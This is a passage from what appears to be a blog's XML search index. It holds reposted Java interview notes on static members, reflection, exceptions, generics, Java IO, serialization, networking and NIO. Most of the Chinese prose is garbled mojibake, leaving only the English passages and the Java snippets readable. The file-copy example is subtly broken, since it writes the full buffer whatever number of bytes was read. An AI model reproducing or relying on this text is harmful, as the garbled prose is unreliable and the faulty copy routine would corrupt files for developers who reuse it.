é™æ€å˜é‡åœ¨å†…å­˜ä¸­åªå­˜åœ¨ä¸€ä»½ï¼Œåªåœ¨ç±»åˆå§‹åŒ–æ—¶èµ‹å€¼ä¸€æ¬¡ã€‚ é™æ€å˜é‡ï¼šç±»æ‰€æœ‰çš„å®ä¾‹éƒ½å…±äº«é™æ€å˜é‡ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ç±»åæ¥è®¿é—®å®ƒï¼› å®ä¾‹å˜é‡ï¼šæ¯åˆ›å»ºä¸€ä¸ªå®ä¾‹å°±ä¼šäº§ç”Ÿä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œå®ƒä¸è¯¥å®ä¾‹åŒç”Ÿå…±æ­»ã€‚ 1234567891011public class A &#123; private int x; // å®ä¾‹å˜é‡ private static int y; // é™æ€å˜é‡ public static void main(String[] args) &#123; // int x = A.x; // Non-static field 'x' cannot be referenced from a static context A a = new A(); int x = a.x; int y = A.y; &#125;&#125; 2. é™æ€æ–¹æ³• é™æ€æ–¹æ³•åœ¨ç±»åŠ è½½çš„æ—¶å€™å°±å­˜åœ¨äº†ï¼Œå®ƒä¸ä¾èµ–äºä»»ä½•å®ä¾‹ï¼Œæ‰€ä»¥é™æ€æ–¹æ³•å¿…é¡»æœ‰å®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½æ˜¯æŠ½è±¡æ–¹æ³•ï¼ˆabstractï¼‰ã€‚ 12345public abstract class A &#123; public static void func1()&#123; &#125; // public abstract static void func2(); // Illegal combination of modifiers: 'abstract' and 'static'&#125; åªèƒ½è®¿é—®æ‰€å±ç±»çš„é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•ï¼Œæ–¹æ³•ä¸­ä¸èƒ½æœ‰ this å’Œ super å…³é”®å­—ã€‚ 12345678910public class A &#123; private static int x; private int y; public static void func1()&#123; int a = x; // int b = y; // Non-static field 'y' cannot be referenced from a static context // int b = this.y; // 'A.this' cannot be referenced from a static context &#125;&#125; 3. é™æ€è¯­å¥å— é™æ€è¯­å¥å—åœ¨ç±»åˆå§‹åŒ–æ—¶è¿è¡Œä¸€æ¬¡ã€‚ 12345678910public class A &#123; static &#123; System.out.println("123"); &#125; public static void main(String[] args) &#123; A a1 = new A(); A a2 = new A(); &#125;&#125; 1123 4. é™æ€å†…éƒ¨ç±» éé™æ€å†…éƒ¨ç±»ä¾èµ–äºéœ€è¦å¤–éƒ¨ç±»çš„å®ä¾‹ï¼Œè€Œé™æ€å†…éƒ¨ç±»ä¸éœ€è¦ã€‚ 1234567891011121314public class OuterClass &#123; class InnerClass &#123; &#125; static class StaticInnerClass &#123; &#125; public static void main(String[] args) &#123; // InnerClass innerClass = new InnerClass(); // 'OuterClass.this' cannot be referenced from a static context OuterClass outerClass = new OuterClass(); InnerClass innerClass = outerClass.new InnerClass(); StaticInnerClass staticInnerClass = new StaticInnerClass(); &#125;&#125; é™æ€å†…éƒ¨ç±»ä¸èƒ½è®¿é—®å¤–éƒ¨ç±»çš„éé™æ€çš„å˜é‡å’Œæ–¹æ³•ã€‚ 5. é™æ€å¯¼åŒ… 1import static com.xxx.ClassName.* åœ¨ä½¿ç”¨é™æ€å˜é‡å’Œæ–¹æ³•æ—¶ä¸ç”¨å†æŒ‡æ˜ ClassNameï¼Œä»è€Œç®€åŒ–ä»£ç ï¼Œä½†å¯è¯»æ€§å¤§å¤§é™ä½ã€‚ 6. åˆå§‹åŒ–é¡ºåº é™æ€å˜é‡å’Œé™æ€è¯­å¥å—ä¼˜å…ˆäºå®ä¾‹å˜é‡å’Œæ™®é€šè¯­å¥å—ï¼Œé™æ€å˜é‡å’Œé™æ€è¯­å¥å—çš„åˆå§‹åŒ–é¡ºåºå–å†³äºå®ƒä»¬åœ¨ä»£ç ä¸­çš„é¡ºåºã€‚ 1public static String staticField = "é™æ€å˜é‡"; 123static &#123; System.out.println("é™æ€è¯­å¥å—");&#125; 1public String field = "å®ä¾‹å˜é‡"; 123&#123; System.out.println("æ™®é€šè¯­å¥å—");&#125; æœ€åæ‰æ˜¯æ„é€ å‡½æ•°çš„åˆå§‹åŒ–ã€‚ 123public InitialOrderTest() &#123; System.out.println("æ„é€ å‡½æ•°");&#125; å­˜åœ¨ç»§æ‰¿çš„æƒ…å†µä¸‹ï¼Œåˆå§‹åŒ–é¡ºåºä¸ºï¼š çˆ¶ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰ å­ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰ çˆ¶ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰ çˆ¶ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰ å­ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰ å­ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰ ä¸ƒã€åå°„æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª Class å¯¹è±¡ï¼ŒåŒ…å«äº†ä¸ç±»æœ‰å…³çš„ä¿¡æ¯ã€‚å½“ç¼–è¯‘ä¸€ä¸ªæ–°ç±»æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªåŒåçš„ .class æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…å®¹ä¿å­˜ç€ Class å¯¹è±¡ã€‚ ç±»åŠ è½½ç›¸å½“äº Class å¯¹è±¡çš„åŠ è½½ã€‚ç±»åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰åŠ¨æ€åŠ è½½åˆ° JVM ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ Class.forName(â€œcom.mysql.jdbc.Driverâ€) è¿™ç§æ–¹å¼æ¥æ§åˆ¶ç±»çš„åŠ è½½ï¼Œè¯¥æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Class å¯¹è±¡ã€‚ åå°„å¯ä»¥æä¾›è¿è¡Œæ—¶çš„ç±»ä¿¡æ¯ï¼Œå¹¶ä¸”è¿™ä¸ªç±»å¯ä»¥åœ¨è¿è¡Œæ—¶æ‰åŠ è½½è¿›æ¥ï¼Œç”šè‡³åœ¨ç¼–è¯‘æ—¶æœŸè¯¥ç±»çš„ .class ä¸å­˜åœ¨ä¹Ÿå¯ä»¥åŠ è½½è¿›æ¥ã€‚ Class å’Œ java.lang.reflect ä¸€èµ·å¯¹åå°„æä¾›äº†æ”¯æŒï¼Œjava.lang.reflect ç±»åº“ä¸»è¦åŒ…å«äº†ä»¥ä¸‹ä¸‰ä¸ªç±»ï¼š Field ï¼šå¯ä»¥ä½¿ç”¨ get() å’Œ set() æ–¹æ³•è¯»å–å’Œä¿®æ”¹ Field å¯¹è±¡å…³è”çš„å­—æ®µï¼› Method ï¼šå¯ä»¥ä½¿ç”¨ invoke() æ–¹æ³•è°ƒç”¨ä¸ Method å¯¹è±¡å…³è”çš„æ–¹æ³•ï¼› Constructor ï¼šå¯ä»¥ç”¨ Constructor åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚ Advantages of Using Reflection: Extensibility Features : An application may make use of external, user-defined classes by creating instances of extensibility objects using their fully-qualified names. Class Browsers and Visual Development Environments : A class browser needs to be able to enumerate the members of classes. Visual development environments can benefit from making use of type information available in reflection to aid the developer in writing correct code. Debuggers and Test Tools : Debuggers need to be able to examine private members on classes. Test harnesses can make use of reflection to systematically call a discoverable set APIs defined on a class, to insure a high level of code coverage in a test suite. Drawbacks of Reflection: Reflection is powerful, but should not be used indiscriminately. If it is possible to perform an operation without using reflection, then it is preferable to avoid using it. The following concerns should be kept in mind when accessing code via reflection. Performance Overhead : Because reflection involves types that are dynamically resolved, certain Java virtual machine optimizations can not be performed. Consequently, reflective operations have slower performance than their non-reflective counterparts, and should be avoided in sections of code which are called frequently in performance-sensitive applications. Security Restrictions : Reflection requires a runtime permission which may not be present when running under a security manager. This is in an important consideration for code which has to run in a restricted security context, such as in an Applet. Exposure of Internals :Since reflection allows code to perform operations that would be illegal in non-reflective code, such as accessing private fields and methods, the use of reflection can result in unexpected side-effects, which may render code dysfunctional and may destroy portability. Reflective code breaks abstractions and therefore may change behavior with upgrades of the platform. Trail: The Reflection API æ·±å…¥è§£æ Java åå°„ï¼ˆ1ï¼‰- åŸºç¡€ å…«ã€å¼‚å¸¸Throwable å¯ä»¥ç”¨æ¥è¡¨ç¤ºä»»ä½•å¯ä»¥ä½œä¸ºå¼‚å¸¸æŠ›å‡ºçš„ç±»ï¼Œåˆ†ä¸ºä¸¤ç§ï¼š Error å’Œ Exceptionã€‚å…¶ä¸­ Error ç”¨æ¥è¡¨ç¤º JVM æ— æ³•å¤„ç†çš„é”™è¯¯ï¼ŒException åˆ†ä¸ºä¸¤ç§ï¼š å—æ£€å¼‚å¸¸ ï¼šéœ€è¦ç”¨ tryâ€¦catchâ€¦ è¯­å¥æ•è·å¹¶è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”å¯ä»¥ä»å¼‚å¸¸ä¸­æ¢å¤ï¼› éå—æ£€å¼‚å¸¸ ï¼šæ˜¯ç¨‹åºè¿è¡Œæ—¶é”™è¯¯ï¼Œä¾‹å¦‚é™¤ 0 ä¼šå¼•å‘ Arithmetic Exceptionï¼Œæ­¤æ—¶ç¨‹åºå¥”æºƒå¹¶ä¸”æ— æ³•æ¢å¤ã€‚ Java å…¥é—¨ä¹‹å¼‚å¸¸å¤„ç† Java å¼‚å¸¸çš„é¢è¯•é—®é¢˜åŠç­”æ¡ˆ -Part 1 ä¹ã€æ³›å‹123456public class Box&lt;T&gt; &#123; // T stands for "Type" private T t; public void set(T t) &#123; this.t = t; &#125; public T get() &#123; return t; &#125;&#125; Java æ³›å‹è¯¦è§£ 10 é“ Java æ³›å‹é¢è¯•é¢˜ åã€æ³¨è§£Java æ³¨è§£æ˜¯é™„åŠ åœ¨ä»£ç ä¸­çš„ä¸€äº›å…ƒä¿¡æ¯ï¼Œç”¨äºä¸€äº›å·¥å…·åœ¨ç¼–è¯‘ã€è¿è¡Œæ—¶è¿›è¡Œè§£æå’Œä½¿ç”¨ï¼Œèµ·åˆ°è¯´æ˜ã€é…ç½®çš„åŠŸèƒ½ã€‚æ³¨è§£ä¸ä¼šä¹Ÿä¸èƒ½å½±å“ä»£ç çš„å®é™…é€»è¾‘ï¼Œä»…ä»…èµ·åˆ°è¾…åŠ©æ€§çš„ä½œç”¨ã€‚ æ³¨è§£ Annotation å®ç°åŸç†ä¸è‡ªå®šä¹‰æ³¨è§£ä¾‹å­ åä¸€ã€ç‰¹æ€§Java å„ç‰ˆæœ¬çš„æ–°ç‰¹æ€§New highlights in Java SE 8 Lambda Expressions Pipelines and Streams Date and Time API Default Methods Type Annotations Nashhorn JavaScript Engine Concurrent Accumulators Parallel operations PermGen Error Removed New highlights in Java SE 7 Strings in Switch Statement Type Inference for Generic Instance Creation Multiple Exception Handling Support for Dynamic Languages Try with Resources Java nio Package Binary Literals, Underscore in literals Diamond Syntax Difference between Java 1.8 and Java 1.7? Java 8 ç‰¹æ€§ Java ä¸ C++ çš„åŒºåˆ« Java æ˜¯çº¯ç²¹çš„é¢å‘å¯¹è±¡è¯­è¨€ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ç»§æ‰¿è‡ª java.lang.Objectï¼ŒC++ ä¸ºäº†å…¼å®¹ C å³æ”¯æŒé¢å‘å¯¹è±¡ä¹Ÿæ”¯æŒé¢å‘è¿‡ç¨‹ã€‚ Java é€šè¿‡è™šæ‹Ÿæœºä»è€Œå®ç°è·¨å¹³å°ç‰¹æ€§ï¼Œä½†æ˜¯ C++ ä¾èµ–äºç‰¹å®šçš„å¹³å°ã€‚ Java æ²¡æœ‰æŒ‡é’ˆï¼Œå®ƒçš„å¼•ç”¨å¯ä»¥ç†è§£ä¸ºå®‰å…¨æŒ‡é’ˆï¼Œè€Œ C++ å…·æœ‰å’Œ C ä¸€æ ·çš„æŒ‡é’ˆã€‚ Java æ”¯æŒè‡ªåŠ¨åƒåœ¾å›æ”¶ï¼Œè€Œ C++ éœ€è¦æ‰‹åŠ¨å›æ”¶ã€‚ Java ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œåªèƒ½é€šè¿‡å®ç°å¤šä¸ªæ¥å£æ¥è¾¾åˆ°ç›¸åŒç›®çš„ï¼Œè€Œ C++ æ”¯æŒå¤šé‡ç»§æ‰¿ã€‚ Java ä¸æ”¯æŒæ“ä½œç¬¦é‡è½½ï¼Œè™½ç„¶å¯ä»¥å¯¹ä¸¤ä¸ª String å¯¹è±¡æ”¯æŒåŠ æ³•è¿ç®—ï¼Œä½†æ˜¯è¿™æ˜¯è¯­è¨€å†…ç½®æ”¯æŒçš„æ“ä½œï¼Œä¸å±äºæ“ä½œç¬¦é‡è½½ï¼Œè€Œ C++ å¯ä»¥ã€‚ Java å†…ç½®äº†çº¿ç¨‹çš„æ”¯æŒï¼Œè€Œ C++ éœ€è¦ä¾é ç¬¬ä¸‰æ–¹åº“ã€‚ Java çš„ goto æ˜¯ä¿ç•™å­—ï¼Œä½†æ˜¯ä¸å¯ç”¨ï¼ŒC++ å¯ä»¥ä½¿ç”¨ gotoã€‚ Java ä¸æ”¯æŒæ¡ä»¶ç¼–è¯‘ï¼ŒC++ é€šè¿‡ #ifdef #ifndef ç­‰é¢„å¤„ç†å‘½ä»¤ä»è€Œå®ç°æ¡ä»¶ç¼–è¯‘ã€‚ What are the main differences between Java and C++? JRE or JDK JRE is the JVM program, Java application need to run on JRE. JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler â€œjavacâ€ å‚è€ƒèµ„æ–™ Eckel B. Java ç¼–ç¨‹æ€æƒ³[M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2002. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java IO]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20IO%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è§ˆ äºŒã€ç£ç›˜æ“ä½œ ä¸‰ã€å­—èŠ‚æ“ä½œ å››ã€å­—ç¬¦æ“ä½œ äº”ã€å¯¹è±¡æ“ä½œ å…­ã€ç½‘ç»œæ“ä½œ InetAddress URL Sockets Datagram ä¸ƒã€NIO æµä¸å— é€šé“ä¸ç¼“å†²åŒº ç¼“å†²åŒºçŠ¶æ€å˜é‡ æ–‡ä»¶ NIO å®ä¾‹ é€‰æ‹©å™¨ å¥—æ¥å­— NIO å®ä¾‹ å†…å­˜æ˜ å°„æ–‡ä»¶ å¯¹æ¯” å…«ã€å‚è€ƒèµ„æ–™ ä¸€ã€æ¦‚è§ˆJava çš„ I/O å¤§æ¦‚å¯ä»¥åˆ†æˆä»¥ä¸‹å‡ ç±»ï¼š ç£ç›˜æ“ä½œï¼šFile å­—èŠ‚æ“ä½œï¼šInputStream å’Œ OutputStream å­—ç¬¦æ“ä½œï¼šReader å’Œ Writer å¯¹è±¡æ“ä½œï¼šSerializable ç½‘ç»œæ“ä½œï¼šSocket æ–°çš„è¾“å…¥/è¾“å‡ºï¼šNIO äºŒã€ç£ç›˜æ“ä½œFile ç±»å¯ä»¥ç”¨äºè¡¨ç¤ºæ–‡ä»¶å’Œç›®å½•çš„ä¿¡æ¯ï¼Œä½†æ˜¯å®ƒä¸è¡¨ç¤ºæ–‡ä»¶çš„å†…å®¹ã€‚ é€’å½’åœ°è¾“å‡ºä¸€ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼š 12345678910111213public static void listAllFiles(File dir)&#123; if (dir == null || !dir.exists()) &#123; return; &#125; if (dir.isFile()) &#123; System.out.println(dir.getName()); return; &#125; for (File file : Objects.requireNonNull(dir.listFiles())) &#123; listAllFiles(file); &#125;&#125; ä¸‰ã€å­—èŠ‚æ“ä½œä½¿ç”¨å­—èŠ‚æµæ“ä½œè¿›è¡Œæ–‡ä»¶å¤åˆ¶ï¼š 12345678910111213public static void copyFile(String src, String dist) throws IOException&#123; FileInputStream in = new FileInputStream(src); FileOutputStream out = new FileOutputStream(dist); byte[] buffer = new byte[20 * 1024]; /* read() æœ€å¤šè¯»å– buffer.length ä¸ªå­—èŠ‚ è¿”å›çš„æ˜¯å®é™…è¯»å–çš„ä¸ªæ•°ï¼Œè¿”å› -1 çš„æ—¶å€™è¡¨ç¤ºè¯»åˆ° eofï¼Œå³æ–‡ä»¶å°¾ */ while (in.read(buffer, 0, buffer.length) != -1) &#123; out.write(buffer); &#125; in.close(); out.close();&#125; Java I/O ä½¿ç”¨äº†è£…é¥°è€…æ¨¡å¼æ¥å®ç°ã€‚ä»¥ InputStream ä¸ºä¾‹ï¼ŒInputStream æ˜¯æŠ½è±¡ç»„ä»¶ï¼ŒFileInputStream æ˜¯ InputStream çš„å­ç±»ï¼Œå±äºå…·ä½“ç»„ä»¶ï¼Œæä¾›äº†å­—èŠ‚æµçš„è¾“å…¥æ“ä½œã€‚FilterInputStream å±äºæŠ½è±¡è£…é¥°è€…ï¼Œè£…é¥°è€…ç”¨äºè£…é¥°ç»„ä»¶ï¼Œä¸ºç»„ä»¶æä¾›é¢å¤–çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ BufferedInputStream ä¸º FileInputStream æä¾›ç¼“å­˜çš„åŠŸèƒ½ã€‚ å®ä¾‹åŒ–ä¸€ä¸ªå…·æœ‰ç¼“å­˜åŠŸèƒ½çš„å­—èŠ‚æµå¯¹è±¡æ—¶ï¼Œåªéœ€è¦åœ¨ FileInputStream å¯¹è±¡ä¸Šå†å¥—ä¸€å±‚ BufferedInputStream å¯¹è±¡å³å¯ã€‚ 12FileInputStream fileInputStream = new FileInputStream("file/1.txt");BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream); DataInputStream è£…é¥°è€…æä¾›äº†å¯¹æ›´å¤šæ•°æ®ç±»å‹è¿›è¡Œè¾“å…¥çš„æ“ä½œï¼Œæ¯”å¦‚ intã€double ç­‰åŸºæœ¬ç±»å‹ã€‚ å››ã€å­—ç¬¦æ“ä½œä¸ç®¡æ˜¯ç£ç›˜è¿˜æ˜¯ç½‘ç»œä¼ è¾“ï¼Œæœ€å°çš„å­˜å‚¨å•å…ƒéƒ½æ˜¯å­—èŠ‚ï¼Œè€Œä¸æ˜¯å­—ç¬¦ã€‚ä½†æ˜¯åœ¨ç¨‹åºä¸­æ“ä½œçš„é€šå¸¸æ˜¯å­—ç¬¦å½¢å¼çš„æ•°æ®ï¼Œå› æ­¤éœ€è¦æä¾›å¯¹å­—ç¬¦è¿›è¡Œæ“ä½œçš„æ–¹æ³•ã€‚ InputStreamReader å®ç°ä»æ–‡æœ¬æ–‡ä»¶çš„å­—èŠ‚æµè§£ç æˆå­—ç¬¦æµï¼› OutputStreamWriter å®ç°å­—ç¬¦æµç¼–ç æˆä¸ºæ–‡æœ¬æ–‡ä»¶çš„å­—èŠ‚æµã€‚ é€è¡Œè¾“å‡ºæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼š 12345678910FileReader fileReader = new FileReader("file/1.txt");BufferedReader bufferedReader = new BufferedReader(fileReader);String line;while ((line = bufferedReader.readLine()) != null) &#123; System.out.println(line);&#125;/* è£…é¥°è€…æ¨¡å¼ä½¿å¾— BufferedReader ç»„åˆäº†ä¸€ä¸ª Reader å¯¹è±¡ åœ¨è°ƒç”¨ BufferedReader çš„ close() æ–¹æ³•æ—¶ä¼šå»è°ƒç”¨ fileReader çš„ close() æ–¹æ³• å› æ­¤åªè¦ä¸€ä¸ª close() è°ƒç”¨å³å¯ */bufferedReader.close(); ç¼–ç å°±æ˜¯æŠŠå­—ç¬¦è½¬æ¢ä¸ºå­—èŠ‚ï¼Œè€Œè§£ç æ˜¯æŠŠå­—èŠ‚é‡æ–°ç»„åˆæˆå­—ç¬¦ã€‚ å¦‚æœç¼–ç å’Œè§£ç è¿‡ç¨‹ä½¿ç”¨ä¸åŒçš„ç¼–ç æ–¹å¼é‚£ä¹ˆå°±å‡ºç°äº†ä¹±ç ã€‚ GBK ç¼–ç ä¸­ï¼Œä¸­æ–‡å­—ç¬¦å  2 ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡å­—ç¬¦å  1 ä¸ªå­—èŠ‚ï¼› UTF-8 ç¼–ç ä¸­ï¼Œä¸­æ–‡å­—ç¬¦å  3 ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡å­—ç¬¦å  1 ä¸ªå­—èŠ‚ï¼› UTF-16be ç¼–ç ä¸­ï¼Œä¸­æ–‡å­—ç¬¦å’Œè‹±æ–‡å­—ç¬¦éƒ½å  2 ä¸ªå­—èŠ‚ã€‚ UTF-16be ä¸­çš„ be æŒ‡çš„æ˜¯ Big Endianï¼Œä¹Ÿå°±æ˜¯å¤§ç«¯ã€‚ç›¸åº”åœ°ä¹Ÿæœ‰ UTF-16leï¼Œle æŒ‡çš„æ˜¯ Little Endianï¼Œä¹Ÿå°±æ˜¯å°ç«¯ã€‚ Java ä½¿ç”¨åŒå­—èŠ‚ç¼–ç  UTF-16beï¼Œè¿™ä¸æ˜¯æŒ‡ Java åªæ”¯æŒè¿™ä¸€ç§ç¼–ç æ–¹å¼ï¼Œè€Œæ˜¯è¯´ char è¿™ç§ç±»å‹ä½¿ç”¨ UTF-16be è¿›è¡Œç¼–ç ã€‚char ç±»å‹å  16 ä½ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼ŒJava ä½¿ç”¨è¿™ç§åŒå­—èŠ‚ç¼–ç æ˜¯ä¸ºäº†è®©ä¸€ä¸ªä¸­æ–‡æˆ–è€…ä¸€ä¸ªè‹±æ–‡éƒ½èƒ½ä½¿ç”¨ä¸€ä¸ª char æ¥å­˜å‚¨ã€‚ String å¯ä»¥çœ‹æˆä¸€ä¸ªå­—ç¬¦åºåˆ—ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªç¼–ç æ–¹å¼å°†å®ƒè½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªç¼–ç æ–¹å¼å°†ä¸€ä¸ªå­—èŠ‚åºåˆ—è½¬æ¢ä¸º Stringã€‚ 1234String str1 = "ä¸­æ–‡";byte[] bytes = str1.getBytes("UTF-8");String str2 = new String(bytes, "UTF-8");System.out.println(str2); åœ¨è°ƒç”¨æ— å‚æ•° getBytes() æ–¹æ³•æ—¶ï¼Œé»˜è®¤çš„ç¼–ç æ–¹å¼ä¸æ˜¯ UTF-16beã€‚åŒå­—èŠ‚ç¼–ç çš„å¥½å¤„æ˜¯å¯ä»¥ä½¿ç”¨ä¸€ä¸ª char å­˜å‚¨ä¸­æ–‡å’Œè‹±æ–‡ï¼Œè€Œå°† String è½¬ä¸º bytes[] å­—èŠ‚æ•°ç»„å°±ä¸å†éœ€è¦è¿™ä¸ªå¥½å¤„ï¼Œå› æ­¤ä¹Ÿå°±ä¸å†éœ€è¦åŒå­—èŠ‚ç¼–ç ã€‚getBytes() çš„é»˜è®¤ç¼–ç æ–¹å¼ä¸å¹³å°æœ‰å…³ï¼Œä¸€èˆ¬ä¸º UTF-8ã€‚ 1byte[] bytes = str1.getBytes(); äº”ã€å¯¹è±¡æ“ä½œåºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå­—èŠ‚åºåˆ—ï¼Œæ–¹ä¾¿å­˜å‚¨å’Œä¼ è¾“ã€‚ åºåˆ—åŒ–ï¼šObjectOutputStream.writeObject() ååºåˆ—åŒ–ï¼šObjectInputStream.readObject() åºåˆ—åŒ–çš„ç±»éœ€è¦å®ç° Serializable æ¥å£ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªæ ‡å‡†ï¼Œæ²¡æœ‰ä»»ä½•æ–¹æ³•éœ€è¦å®ç°ï¼Œä½†æ˜¯å¦‚æœä¸å»å®ç°å®ƒçš„è¯è€Œè¿›è¡Œåºåˆ—åŒ–ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ 12345678910111213141516171819202122232425262728293031public static void main(String[] args) throws IOException, ClassNotFoundException&#123; A a1 = new A(123, "abc"); String objectFile = "file/a1"; ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(objectFile)); objectOutputStream.writeObject(a1); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(objectFile)); A a2 = (A) objectInputStream.readObject(); objectInputStream.close(); System.out.println(a2);&#125;private static class A implements Serializable&#123; private int x; private String y; A(int x, String y) &#123; this.x = x; this.y = y; &#125; @Override public String toString() &#123; return "x = " + x + " " + "y = " + y; &#125;&#125; ä¸ä¼šå¯¹é™æ€å˜é‡è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºåºåˆ—åŒ–åªæ˜¯ä¿å­˜å¯¹è±¡çš„çŠ¶æ€ï¼Œé™æ€å˜é‡å±äºç±»çš„çŠ¶æ€ã€‚ transient å…³é”®å­—å¯ä»¥ä½¿ä¸€äº›å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚ ArrayList åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å®ç° ï¼šArrayList ä¸­å­˜å‚¨æ•°æ®çš„æ•°ç»„æ˜¯ç”¨ transient ä¿®é¥°çš„ï¼Œå› ä¸ºè¿™ä¸ªæ•°ç»„æ˜¯åŠ¨æ€æ‰©å±•çš„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç©ºé—´éƒ½è¢«ä½¿ç”¨ï¼Œå› æ­¤å°±ä¸éœ€è¦æ‰€æœ‰çš„å†…å®¹éƒ½è¢«åºåˆ—åŒ–ã€‚é€šè¿‡é‡å†™åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹æ³•ï¼Œä½¿å¾—å¯ä»¥åªåºåˆ—åŒ–æ•°ç»„ä¸­æœ‰å†…å®¹çš„é‚£éƒ¨åˆ†æ•°æ®ã€‚ 1private transient Object[] elementData; å…­ã€ç½‘ç»œæ“ä½œJava ä¸­çš„ç½‘ç»œæ”¯æŒï¼š InetAddressï¼šç”¨äºè¡¨ç¤ºç½‘ç»œä¸Šçš„ç¡¬ä»¶èµ„æºï¼Œå³ IP åœ°å€ï¼› URLï¼šç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼› Socketsï¼šä½¿ç”¨ TCP åè®®å®ç°ç½‘ç»œé€šä¿¡ï¼› Datagramï¼šä½¿ç”¨ UDP åè®®å®ç°ç½‘ç»œé€šä¿¡ã€‚ InetAddressæ²¡æœ‰å…¬æœ‰æ„é€ å‡½æ•°ï¼Œåªèƒ½é€šè¿‡é™æ€æ–¹æ³•æ¥åˆ›å»ºå®ä¾‹ã€‚ 12InetAddress.getByName(String host);InetAddress.getByAddress(byte[] address); URLå¯ä»¥ç›´æ¥ä» URL ä¸­è¯»å–å­—èŠ‚æµæ•°æ®ã€‚ 12345678910111213public static void main(String[] args) throws IOException&#123; URL url = new URL("http://www.baidu.com"); InputStream is = url.openStream(); /* å­—èŠ‚æµ */ InputStreamReader isr = new InputStreamReader(is, "utf-8"); /* å­—ç¬¦æµ */ BufferedReader br = new BufferedReader(isr); String line = br.readLine(); while (line != null) &#123; System.out.println(line); line = br.readLine(); &#125; br.close();&#125; Sockets ServerSocketï¼šæœåŠ¡å™¨ç«¯ç±» Socketï¼šå®¢æˆ·ç«¯ç±» æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯é€šè¿‡ InputStream å’Œ OutputStream è¿›è¡Œè¾“å…¥è¾“å‡ºã€‚ Datagram DatagramPacketï¼šæ•°æ®åŒ…ç±» DatagramSocketï¼šé€šä¿¡ç±» ä¸ƒã€NIO Java NIO Tutorial Java NIO æµ…æ IBM: NIO å…¥é—¨ æ–°çš„è¾“å…¥/è¾“å‡º (NIO) åº“æ˜¯åœ¨ JDK 1.4 ä¸­å¼•å…¥çš„ã€‚NIO å¼¥è¡¥äº†åŸæ¥çš„ I/O çš„ä¸è¶³ï¼Œæä¾›äº†é«˜é€Ÿçš„ã€é¢å‘å—çš„ I/Oã€‚ æµä¸å—I/O ä¸ NIO æœ€é‡è¦çš„åŒºåˆ«æ˜¯æ•°æ®æ‰“åŒ…å’Œä¼ è¾“çš„æ–¹å¼ï¼ŒI/O ä»¥æµçš„æ–¹å¼å¤„ç†æ•°æ®ï¼Œè€Œ NIO ä»¥å—çš„æ–¹å¼å¤„ç†æ•°æ®ã€‚ é¢å‘æµçš„ I/O ä¸€æ¬¡å¤„ç†ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œä¸€ä¸ªè¾“å…¥æµäº§ç”Ÿä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œä¸€ä¸ªè¾“å‡ºæµæ¶ˆè´¹ä¸€ä¸ªå­—èŠ‚æ•°æ®ã€‚ä¸ºæµå¼æ•°æ®åˆ›å»ºè¿‡æ»¤å™¨éå¸¸å®¹æ˜“ï¼Œé“¾æ¥å‡ ä¸ªè¿‡æ»¤å™¨ï¼Œä»¥ä¾¿æ¯ä¸ªè¿‡æ»¤å™¨åªè´Ÿè´£å¤æ‚å¤„ç†æœºåˆ¶çš„ä¸€éƒ¨åˆ†ã€‚ä¸åˆ©çš„ä¸€é¢æ˜¯ï¼Œé¢å‘æµçš„ I/O 